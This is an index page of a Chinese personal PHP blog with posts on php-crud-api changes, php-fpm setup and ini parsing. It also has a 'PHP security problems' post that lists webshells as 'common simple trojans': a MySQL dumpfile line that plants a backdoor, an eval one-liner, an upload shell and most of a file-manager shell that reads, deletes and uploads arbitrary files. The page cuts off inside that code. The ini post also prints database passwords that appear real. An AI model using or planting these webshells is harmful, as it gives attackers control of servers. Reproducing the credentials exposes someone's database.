<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">

<link rel="stylesheet" href="/blog/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/blog/","images":"/blog/images","scheme":"Muse","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>
<meta name="description" content="思绪偶尔会在这里停留">
<meta property="og:type" content="website">
<meta property="og:title" content="超凡魔力">
<meta property="og:url" content="http://example.com/page/33/index.html">
<meta property="og:site_name" content="超凡魔力">
<meta property="og:description" content="思绪偶尔会在这里停留">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="chaofml">
<meta property="article:tag" content="个人博客、超凡魔力">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/33/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>
<title>超凡魔力</title>
  



  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
    </div>
  </div>

  <div class="site-meta">

    <a href="/blog/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">超凡魔力</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">君子善思，善假于物，而不物于物。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">chaofml</p>
  <div class="site-description" itemprop="description">思绪偶尔会在这里停留</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/blog/archives">
          <span class="site-state-item-count">357</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/blog/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/blog/tags/">
        <span class="site-state-item-count">97</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/php-crud-api/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/php-crud-api/" class="post-title-link" itemprop="url">php-crud-api改造记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="php-crud-api改造记"><a href="#php-crud-api改造记" class="headerlink" title="php-crud-api改造记"></a>php-crud-api改造记</h1><h2 id="php-crud-api地址"><a href="#php-crud-api地址" class="headerlink" title="php-crud-api地址"></a><a target="_blank" rel="noopener" href="https://github.com/mevdschee/php-crud-api">php-crud-api地址</a></h2><blockquote>
<p>这个是小组组长要求使用到的一个开源的php的库。目地是，减少php代码，使精力专注在前端页面上。但是在使用过程中，发现并不能很好的与前端的Extjs框架配合好。为了解决这个问题，便要对其进行适当的改进。</p>
</blockquote>
<h1 id="改造如下"><a href="#改造如下" class="headerlink" title="改造如下"></a>改造如下</h1><h2 id="前端提交表单，需要返回success字段"><a href="#前端提交表单，需要返回success字段" class="headerlink" title="前端提交表单，需要返回success字段"></a>前端提交表单，需要返回success字段</h2><blockquote>
<p> 前端需求数据跟后端的api接口返回数据格式不一致，前端需要提交数据成功后，需要增加一个success=true字段，而原有的api框架，只返回成功后的api。需要需要对其进行改造。</p>
</blockquote>
<p>改造得比较丑，代码可以优化。另外，这种需求是简单的处理。结合之前看到的其他的框架，可以用事件插件模式来处理。（参见typecho的设计模式），RecordController.php，create、update方法。<br>话不多说，代码前后对比：</p>
<h3 id="改造前："><a href="#改造前：" class="headerlink" title="改造前："></a>改造前：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$params &#x3D; $request-&gt;getParams();</span><br><span class="line">if (is_array($record)) &#123;</span><br><span class="line">    $result &#x3D; array();</span><br><span class="line">    foreach ($record as $r) &#123;</span><br><span class="line">        $result[] &#x3D; $this-&gt;service-&gt;create($table, $r, $params);</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;responder-&gt;success($result);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    return $this-&gt;responder-&gt;success($this-&gt;service-&gt;create($table, $record, $params));</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="改造后："><a href="#改造后：" class="headerlink" title="改造后："></a>改造后：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$params &#x3D; $request-&gt;getParams();</span><br><span class="line">$needSuccess&#x3D;false;</span><br><span class="line">if(isset($params[&#39;success&#39;]))&#123;</span><br><span class="line">	$needSuccess&#x3D;true;</span><br><span class="line">&#125;</span><br><span class="line">if (is_array($record)) &#123;</span><br><span class="line">	$result &#x3D; array();</span><br><span class="line">	foreach ($record as $r) &#123;</span><br><span class="line">		$result[] &#x3D; $this-&gt;service-&gt;create($table, $r, $params);</span><br><span class="line">	&#125;</span><br><span class="line">	if($needSuccess)&#123;</span><br><span class="line">		return $this-&gt;responder-&gt;success(array(&#39;success&#39;&#x3D;&gt;true,&#39;result&#39;&#x3D;&gt;$result));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return $this-&gt;responder-&gt;success($result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	if($needSuccess)&#123;</span><br><span class="line">		$result&#x3D;$this-&gt;service-&gt;create($table, $record, $params);</span><br><span class="line">		return $this-&gt;responder-&gt;success(array(&#39;success&#39;&#x3D;&gt;true,&#39;result&#39;&#x3D;&gt;$result));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return $this-&gt;responder-&gt;success($this-&gt;service-&gt;create($table, $record, $params));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/php-nginx-php-fpm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/php-nginx-php-fpm/" class="post-title-link" itemprop="url">php与nginx的安装</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="php与nginx的安装"><a href="#php与nginx的安装" class="headerlink" title="php与nginx的安装"></a>php与nginx的安装</h1><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/beyang/p/6972412.html">CentOS下yum安装PHP，配置php-fpm服务</a></li>
<li><a target="_blank" rel="noopener" href="http://www.zhangc.cn/?id=87">Linux安装PHP7.2及使用Nginx部署PHP项目</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ampl/p/9881660.html">centos7 yum快速安装php7.1</a></li>
</ul>
<h3 id="php-fpm配置"><a href="#php-fpm配置" class="headerlink" title="php-fpm配置"></a>php-fpm配置</h3><p>在Linux中将php-fpm配置成服务的方法</p>
<ul>
<li>1.配置php-fpm.conf</li>
</ul>
<p>vi /usr/local/php/etc/php-fpm.conf</p>
<p>php-fpm.pid 目录必须指向：/usr/local/php/var/run/php-fpm.pid</p>
<ul>
<li>2.拷贝php-fpm脚本至/etc/init.d目录</li>
</ul>
<p>cp /home/soft/php-5.3.15/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</p>
<ul>
<li>3.设置权限并启动php-fpm：</li>
</ul>
<p>chmod 755 /etc/init.d/php-fpm</p>
<p>/etc/init.d/php-fpm start</p>
<p>chkconfig –add php-fpm</p>
<ul>
<li>最后，给出php-fpm以服务的方式启动、停止和重启：</li>
</ul>
<p>service php-fpm start</p>
<p>service php-fpm stop</p>
<p>service php-fpm reload</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/php_ini/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/php_ini/" class="post-title-link" itemprop="url">php与ini文件</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="php与ini文件"><a href="#php与ini文件" class="headerlink" title="php与ini文件"></a>php与ini文件</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul>
<li>其中db.ini配置文件如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root]</span><br><span class="line">username&#x3D;&#39;root&#39;</span><br><span class="line">password&#x3D;&#39;ROOT_shinestb_2019_&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[publish]</span><br><span class="line">username&#x3D;&#39;publish&#39;</span><br><span class="line">password&#x3D;&#39;PUBLISH_shinestb_2019_&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>php主要的操作函数为，parse_ini_file，</li>
</ul>
<blockquote>
<p>参数说明：1、要解析的文件名；2、如果第二个参数默认为false，如果为true，则返回多维数组。</p>
</blockquote>
<p>php代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$tmp&#x3D;parse_ini_file(&#39;db.ini&#39;,TRUE);</span><br><span class="line">var_dump($tmp);</span><br><span class="line">&#x2F;*</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;root&quot;]&#x3D;&gt;</span><br><span class="line">  array(2) &#123;</span><br><span class="line">    [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">    string(4) &quot;root&quot;</span><br><span class="line">    [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">    string(19) &quot;ROOT_shinestb_2019_&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;publish&quot;]&#x3D;&gt;</span><br><span class="line">  array(2) &#123;</span><br><span class="line">    [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">    string(7) &quot;publish&quot;</span><br><span class="line">    [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">    string(22) &quot;PUBLISH_shinestb_2019_&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tmp&#x3D;parse_ini_file(&#39;db.ini&#39;);</span><br><span class="line">var_dump($tmp);</span><br><span class="line">&#x2F;*</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;publish&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(22) &quot;PUBLISH_shinestb_2019_&quot;</span><br><span class="line">&#125;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h1><ul>
<li>ini_get()获取配置参数，ini_set()设置配置参数</li>
<li>ini_get_all()获取所有配置信息</li>
<li>ini_restore()恢复配置信息到原始值</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/07/php%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/blog/images/avatar.gif">
      <meta itemprop="name" content="chaofml">
      <meta itemprop="description" content="思绪偶尔会在这里停留">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="超凡魔力">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/blog/2019/05/07/php%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">php中的安全问题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-05-07 12:12:00" itemprop="dateCreated datePublished" datetime="2019-05-07T12:12:00+08:00">2019-05-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-21 16:54:58" itemprop="dateModified" datetime="2020-12-21T16:54:58+08:00">2020-12-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="php中的安全问题"><a href="#php中的安全问题" class="headerlink" title="php中的安全问题"></a>php中的安全问题</h1><h2 id="mysql部分"><a href="#mysql部分" class="headerlink" title="mysql部分"></a>mysql部分</h2><h3 id="mysql端口未更改"><a href="#mysql端口未更改" class="headerlink" title="mysql端口未更改"></a>mysql端口未更改</h3><p>通过端口扫描，可以找到3306端口，然后通过弱口令，登录到数据库。</p>
<h3 id="mysql文件写权限"><a href="#mysql文件写权限" class="headerlink" title="mysql文件写权限"></a>mysql文件写权限</h3><p>通过以下命令，往数据库里面写数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;写入php可执行脚本，放到web执行目录中</span><br><span class="line">select &quot;&lt;?php  @evel($_GET[&#39;test&#39;]);&quot; into dumpfile &quot;D:&#x2F;ShineMDS&#x2F;xampp&#x2F;htdocs&#x2F;extension&#x2F;test.php&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="php部分"><a href="#php部分" class="headerlink" title="php部分"></a>php部分</h2><h3 id="常见的php简单的木马"><a href="#常见的php简单的木马" class="headerlink" title="常见的php简单的木马"></a>常见的php简单的木马</h3><ul>
<li>直接执行post 或get的提交参数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  @evel($_GET[&#39;test&#39;]);</span><br></pre></td></tr></table></figure>

<ul>
<li>上传文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br></pre></td></tr></table></figure>

<ul>
<li>遍历目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(!empty($_POST[&#39;action&#39;]))&#123;</span><br><span class="line">		$action&#x3D;$_POST[&#39;action&#39;];</span><br><span class="line">		switch($action)&#123;</span><br><span class="line">		case &#39;upload&#39;:</span><br><span class="line">			upload();</span><br><span class="line">		default:</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!empty($_GET[&#39;action&#39;]))&#123;</span><br><span class="line">		$action&#x3D;$_GET[&#39;action&#39;];</span><br><span class="line">		switch($action)&#123;</span><br><span class="line">		case &#39;download&#39;:</span><br><span class="line">			download();</span><br><span class="line">			exit;</span><br><span class="line">		case &#39;delete&#39;:</span><br><span class="line">			deleteFile();</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function download()&#123;</span><br><span class="line">		if(!empty($_GET[&#39;fn&#39;]) &amp;&amp;file_exists($_GET[&#39;fn&#39;]) )&#123;</span><br><span class="line">			$file&#x3D;$_GET[&#39;fn&#39;];</span><br><span class="line">			header(&#39;Content-Description: File Transfer&#39;);</span><br><span class="line">			header(&#39;Content-Type: application&#x2F;octet-stream&#39;);</span><br><span class="line">			header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39;.basename($file).&#39;&quot;&#39;);</span><br><span class="line">			header(&#39;Expires: 0&#39;);</span><br><span class="line">			header(&#39;Cache-Control: must-revalidate&#39;);</span><br><span class="line">			header(&#39;Pragma: public&#39;);</span><br><span class="line">			header(&#39;Content-Length: &#39; . filesize($file));</span><br><span class="line">			readfile($file);</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function deleteFile()&#123;</span><br><span class="line">		if(!empty($_GET[&#39;fn&#39;]) &amp;&amp;file_exists($_GET[&#39;fn&#39;]) )&#123;</span><br><span class="line">			$file&#x3D;$_GET[&#39;fn&#39;];</span><br><span class="line">			unlink($file);</span><br><span class="line">			header(&quot;Location:&quot;.pathinfo(__FILE__)[&#39;basename&#39;].&quot;?path&#x3D;&quot;.dirname($file));	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function upload()&#123;</span><br><span class="line">		$path&#x3D;$_GET[&#39;path&#39;];</span><br><span class="line">		move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.&#39;&#x2F;&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br><span class="line">    &lt;title&gt;文件查看工具&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">	&#x2F;&#x2F;var_dump();</span><br><span class="line">	$curPath&#x3D;dirname(__FILE__);</span><br><span class="line">	&#x2F;&#x2F;echo $curPath;</span><br><span class="line">	$path&#x3D;$curPath;</span><br><span class="line">	if(!empty($_GET[&#39;path&#39;]))&#123;</span><br><span class="line">		$path&#x3D;$_GET[&#39;path&#39;];</span><br><span class="line">	&#125;</span><br><span class="line">	$fh&#x3D;opendir($path);</span><br><span class="line">	$dirs&#x3D;array();</span><br><span class="line">	$files&#x3D;array();</span><br><span class="line">	while($fn&#x3D;readdir($fh))&#123;</span><br><span class="line">		$fn&#x3D;iconv(&#39;gbk&#39;,&#39;UTF-8&#39;,$fn);</span><br><span class="line">		$fullName&#x3D;$path.&#39;&#x2F;&#39;.$fn;</span><br><span class="line">		$info&#x3D;array();</span><br><span class="line">		$info[&#39;fn&#39;]&#x3D;$fn;</span><br><span class="line">		